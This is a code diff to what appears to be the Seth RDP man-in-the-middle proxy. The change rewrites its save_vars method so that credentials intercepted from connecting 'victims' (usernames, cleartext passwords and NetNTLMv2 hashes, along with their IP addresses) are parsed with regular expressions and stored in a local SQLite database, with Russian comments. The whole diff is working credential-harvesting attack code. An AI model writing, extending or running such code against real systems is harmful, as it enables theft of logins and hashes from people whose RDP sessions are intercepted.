@@ -8,11 +8,13 @@ import subprocess
 import time
 from binascii import hexlify, unhexlify
 from base64 import b64encode
+import sqlite3
+from datetime import datetime
+import re
 
 from seth.args import args
 from seth.parsing import *
 import seth.consts as consts
-from suzu_seth import db_add_data
 
 
 class RDPProxy(threading.Thread):
@@ -245,14 +247,51 @@ class RDPProxy(threading.Thread):
 
 
     def save_vars(self, vars):
+        """
+        Сохраняет учетные данные в таблицу 'seth' базы данных suzu.db.
+        Поля: IP, username, password, NetNTLMv2_hash, date_added.
+        """
+        # Подключение к базе данных
+        conn = sqlite3.connect("suzu.db")
+        cursor = conn.cursor()
+
+        # Создание таблицы, если она еще не существует
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS seth (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                IP TEXT,
+                username TEXT,
+                password TEXT,
+                NetNTLMv2_hash TEXT,
+                date_added TEXT
+            )
+        ''')
+
+        # Обработка и сохранение новых данных
         for k, v in vars.items():
             if k not in self.vars:
                 self.vars[k] = v
                 credentials = print_var(k, self.vars)
-                if len(credentials) > 60:
-                    db_add_data(victim_ip=self.addr, victim_hash=credentials)
-                else:
-                    db_add_data(victim_ip=self.addr, victim_password=credentials)
+                print('qqqqqq', credentials)
+                # Извлечение IP, username, password и NT-хэша с помощью регулярных выражений
+                username_match = re.search(r'([^\:*]+)::', credentials)
+                password_match = re.search(r'::([^\:]+):', credentials)
+                netntlmv2_match = re.search(r'([^\:]+)::([^\:]+):([a-fA-F0-9]{16}):([a-fA-F0-9]{32}):([a-fA-F0-9]+)', credentials)
+                
+                ip = self.addr
+                username = username_match.group(1) if username_match else None
+                password = password_match.group(1) if password_match else None
+                netntlm_hash = netntlmv2_match.group(0) if netntlmv2_match else None
+                date_added = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                print(ip, username, password, netntlm_hash)
+                # Вставка данных в таблицу только при наличии IP и хотя бы одного из полей (username или nt_hash)
+                if ip:
+                    cursor.execute('''
+                        INSERT INTO seth (IP, username, password, NetNTLMv2_hash, date_added)
+                        VALUES (?, ?, ?, ?, ?)
+                    ''', (ip, username, password, netntlm_hash, date_added))
+                    conn.commit()
+        conn.close()
 
 
     def handle_ssl_error(self, e):
